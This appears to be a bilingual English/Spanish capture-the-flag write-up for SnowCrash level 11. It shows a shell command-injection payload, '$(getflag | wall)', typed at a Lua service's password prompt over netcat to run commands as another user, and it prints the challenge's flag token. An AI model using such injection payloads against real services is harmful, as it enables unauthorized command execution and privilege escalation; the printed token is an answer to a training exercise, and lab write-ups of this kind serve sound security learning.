# Flag 11

## Tools Used:

* Netcat (`nc`)
* Shell command injection via Lua CGI service

## Process:

1. Connect to the Lua-based challenge service on localhost port 5151:

   ```bash
   level11@SnowCrash:~$ nc localhost 5151
   ```
2. At the password prompt, inject the `getflag` command by leveraging shell expansion:

   ```
   Password: $(getflag | wall)
   ```
3. The service runs under the `flag11` user, so the injected command executes with elevated privileges and broadcasts the flag to all users:

   ```
   Broadcast Message from flag11@Snow
           (somewhere) at 23:44 ...

   Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s

   Erf nope..
   ```
4. Note that the script continues to reject the password afterward, but you’ve already received the flag.

---

# Flag 11

## Herramientas Utilizadas:

* Netcat (`nc`)
* Inyección de comandos en el servicio Lua

## Proceso:

1. Conéctate al servicio Lua en `localhost` puerto `5151`:

   ```bash
   level11@SnowCrash:~$ nc localhost 5151
   ```
2. En el prompt de contraseña, inyecta el comando `getflag` usando expansión de shell:

   ```
   Password: $(getflag | wall)
   ```
3. Dado que el servicio corre como usuario `flag11`, el comando se ejecuta con privilegios elevados y transmite la flag:

   ```
   Broadcast Message from flag11@Snow
           (somewhere) at 23:44 ...

   Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s

   Erf nope..
   ```
4. Aunque el script luego rechaza la contraseña, ya has obtenido la flag.

---

## Scripts Used:

None (injection a través de `nc` y shell)

## Flag:

```
fa6v5ateaw21peobuub8ipe6s
```
